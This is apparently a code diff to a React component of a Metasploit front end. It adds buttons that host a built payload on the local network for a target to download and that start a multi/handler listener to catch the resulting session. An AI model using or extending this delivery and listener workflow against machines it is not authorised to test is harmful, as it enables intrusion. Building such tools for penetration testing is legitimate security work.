@@ -1,25 +1,8 @@
 import React, { useEffect, useMemo, useRef, useState } from 'react'
 import OptionForm from './OptionForm.jsx'
+import { asList, defaultFormatFor, extForFormat } from '../../shared/payloads.js'
 
 const api = window.metadeck
-
-// module.<type> list RPC calls return { modules: [...] }; tolerate a bare array.
-const asList = (r) => (Array.isArray(r) ? r : (r && Array.isArray(r.modules) ? r.modules : []))
-
-// Pick a sensible output format from the payload's platform so builds don't
-// fail on a format/platform mismatch.
-function defaultFormatFor(name) {
-  if (!name) return 'raw'
-  if (name.startsWith('android/')) return 'apk'
-  if (name.startsWith('windows/')) return 'exe'
-  if (name.startsWith('linux/') || name.startsWith('bsd/') || name.startsWith('solaris/')) return 'elf'
-  if (name.startsWith('osx/') || name.startsWith('apple_ios/') || name.includes('/osx/')) return 'macho'
-  if (name.startsWith('java/')) return 'jar'
-  if (name.startsWith('python/')) return 'python'
-  if (name.startsWith('php/')) return 'raw'
-  if (name.startsWith('cmd/')) return 'raw'
-  return 'raw'
-}
 
 export default function PayloadBuilder({ connected, rpc, push }) {
   const [allPayloads, setAllPayloads] = useState([])
@@ -39,6 +22,7 @@ export default function PayloadBuilder({ connected, rpc, push }) {
 
   const [building, setBuilding] = useState(false)
   const [result, setResult] = useState(null)
+  const [hostInfo, setHostInfo] = useState(null)
   const [log, setLog] = useState('')
   const logRef = useRef(null)
 
@@ -161,6 +145,42 @@ export default function PayloadBuilder({ connected, rpc, push }) {
     }
   }
 
+  // Host the just-built file on the LAN so a target can download it.
+  async function hostOnNetwork() {
+    if (!result?.outFile) return
+    try {
+      const info = await api.startFileServer(result.outFile, 8000)
+      setHostInfo(info)
+      push({ kind: 'success', text: 'Hosting on your network — see the link below.' })
+    } catch (e) {
+      push({ kind: 'error', text: e.message })
+    }
+  }
+
+  // Start a multi/handler matching this payload's LHOST/LPORT to catch the session.
+  async function startMatchingListener() {
+    const lhost = values.LHOST
+    const lport = values.LPORT
+    if (!lhost || !lport) {
+      return push({ kind: 'error', text: 'Set LHOST and LPORT above first.' })
+    }
+    try {
+      const res = await rpc('module.execute', [
+        'exploit',
+        'multi/handler',
+        { PAYLOAD: payload, LHOST: lhost, LPORT: Number(lport), ExitOnSession: false }
+      ])
+      if (res && res.job_id != null) {
+        push({
+          kind: 'success',
+          text: `Listener started on ${lhost}:${lport}. The session will appear on the Sessions tab.`
+        })
+      }
+    } catch {
+      /* surfaced by rpc */
+    }
+  }
+
   return (
     <div className="payloads">
       <div className="pb-left">
@@ -278,7 +298,27 @@ export default function PayloadBuilder({ connected, rpc, push }) {
                   <button className="btn" onClick={() => api.revealPath(result.outFile)}>
                     Reveal in Finder
                   </button>
+                  <button className="btn" onClick={hostOnNetwork}>
+                    🌐 Host on local network
+                  </button>
+                  <button className="btn" onClick={startMatchingListener}>
+                    🎧 Start matching listener
+                  </button>
                 </div>
+                {hostInfo && (
+                  <div className="host-link">
+                    <span className="field-label">Download URL(s):</span>
+                    <code>{hostInfo.url}</code>
+                    {(hostInfo.ips || []).map((ip) => (
+                      <code key={ip.address}>
+                        http://{ip.address}:{hostInfo.port}/{hostInfo.fileName}
+                      </code>
+                    ))}
+                    <p className="hint">
+                      Full control of hosting + the download log is on the <b>Deliver</b> tab.
+                    </p>
+                  </div>
+                )}
               </div>
             )}
 
